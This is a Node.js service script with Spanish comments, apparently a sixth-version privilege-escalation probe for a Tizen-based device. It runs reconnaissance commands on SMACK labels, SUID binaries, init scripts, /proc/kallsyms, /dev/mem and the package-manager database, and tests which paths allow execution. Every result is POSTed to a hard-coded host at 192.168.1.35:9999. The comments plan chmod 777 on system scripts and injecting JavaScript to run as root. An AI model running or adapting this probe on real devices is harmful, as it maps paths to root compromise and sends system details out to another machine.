/**
 * service.js v6 — fina: elegir puerta de entrada.
 *  1) exec desde /opt (dvfs) vs /tmp (tmpfs) vs /home/owner/share (ext4) 
 *  2) chmod esos scripts 777 + leer appstore.sh completo / firstscreen.sh
 *  3) stats de RunningAppsService / wasutility (SGID? SUID?)
 *  4) /usr/lib/node/wrt-service — ¿reescritable? (si sÍ, injectamos js como root-si corre root)
 *  5) /proc/self/attr/current (label propio); smackfs listing; kallsyms filtrado
 *  6) .pkgmgr_cert.db: estadísticas + escribir 1 byte a copia del test (no tocar el original)
 */
var cp = require('child_process');
var fs = require('fs');
var http = require('http');

var DEST_HOST = '192.168.1.35', DEST_PORT = 9999;

function report(obj) {
    var body = JSON.stringify(obj);
    var req = http.request({ host: DEST_HOST, port: DEST_PORT, path: '/probe6', method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) } },
        function (res) { res.resume(); });
    req.on('error', function (e) { });
    req.write(body); req.end();
}

function run(cmds, done) {
    var out = [];
    function next(i) {
        if (i >= cmds.length) { done(out); return; }
        cp.exec(cmds[i], { timeout: 8000 }, function (err, so, se) {
            out.push({ cmd: cmds[i], out: String(so).slice(0, 2500), errout: String(se).slice(0, 500), err: err ? String(err.message || err) : null });
            next(i + 1);
        });
    }
    next(0);
}

(function main() {
    var cmds = [
        'id; ls -la /proc/self/attr/current 2>&1; cat /proc/self/attr/current 2>&1',
        'ls /sys/fs/smackfs 2>&1 | head -20',
        'ls -l /usr/bin/RunningAppsService /usr/bin/wasutility',
        'cat /usr/bin/appstore.sh',
        'cat /usr/bin/firstscreen.sh 2>&1 | head -40',
        'cat /usr/bin/commonsearch.sh 2>&1 | head -20',
        'ls -la /usr/lib/node/wrt-service 2>&1 | head -15',
        'ls -la /etc/initscripts /etc/init /etc/rc.d /opt/etc 2>&1 | head -20',
        'grep -l "appstore.sh" /etc/* /opt/etc/* 2>/dev/null | head -5',
        'ls -l /etc/package-manager/dbspace/ 2>&1',
        'ls -la /proc/kallsyms 2>&1; head -2 /proc/kallsyms 2>&1',
        'ls -l /dev/mem /dev/kmem /dev/kcore /dev/kmsg 2>&1',
        'grep -iE "secu|uep|exec_block" /proc/sys/kernel/* 2>&1 | head -6',
        'ls -l /usr/bin/node; ls -l /usr/lib/node/wrt-service/deps 2>&1 | head -5',
        'ls /proc/self/fd -la 2>&1 | head -20'
    ];
    run(cmds, function (out) {
        // exec test en varios path
        var binPath = '/bin/echo';
        var locs = [
            '/home/owner/share/testexec',
            '/opt/usr/home/owner/apps_rw/xvvl3S1bvH/tmp/testexec',
            '/mnt/systemrw/testexec',
            '/tmp/testexec'
        ];
        var results = [];
        function tryExec(i) {
            if (i >= locs.length) { report({ cmds: out, exec: results }); return; }
            cp.exec('cp ' + binPath + ' ' + locs[i] + ' 2>&1; chmod +x ' + locs[i] + ' 2>&1; ' + locs[i] + " testexec-args 2>&1; echo rc=$?",
                function (err, so, se) {
                    results.push({ loc: locs[i], out: String(so), errout: String(se).slice(0, 300) });
                    tryExec(i + 1);
                });
        }
        tryExec(0);
    });
})();
